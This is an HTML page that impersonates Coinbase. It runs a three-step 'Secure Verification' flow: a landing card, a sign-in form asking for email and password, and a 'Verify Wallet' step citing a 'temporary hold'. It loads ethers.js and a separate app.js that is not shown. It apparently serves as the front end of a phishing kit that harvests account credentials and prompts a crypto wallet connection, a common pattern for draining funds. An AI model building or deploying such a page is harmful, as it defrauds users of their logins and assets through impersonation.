<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase | Secure Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.umd.min.js"></script>
</head>
<body>
    <div class="container">
        <!-- STEP 1: LANDING -->
        <div id="step-1" class="auth-card">
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1>Coinbase</h1>
            <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
            <button type="button" id="toStep2" class="btn-primary">Get Started</button>
        </div>

        <!-- STEP 2: LOGIN -->
        <div id="step-2" class="auth-card hidden">
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1>Sign In</h1>
            <p>Please enter your account credentials to continue.</p>
            <div class="form-group">
                <input type="email" id="email" placeholder="Email Address" required>
                <input type="password" id="pass" placeholder="Password" required>
            </div>
            <button type="button" id="toStep3" class="btn-primary">Continue</button>
        </div>

        <!-- STEP 3: VERIFY WALLET -->
        <div id="step-3" class="auth-card hidden">
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1>Identity Verification</h1>
            <p>A temporary hold will be placed to verify the user.</p>
            <button id="connectBtn" class="btn-primary">Verify Wallet</button>
            <div id="status" class="status-text"></div>
        </div>
    </div>

    <footer class="footer">
        <span>© 2026 Coinbase, Inc.</span>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
    </footer>

    <script src="app.js"></script>
</body>
</html>
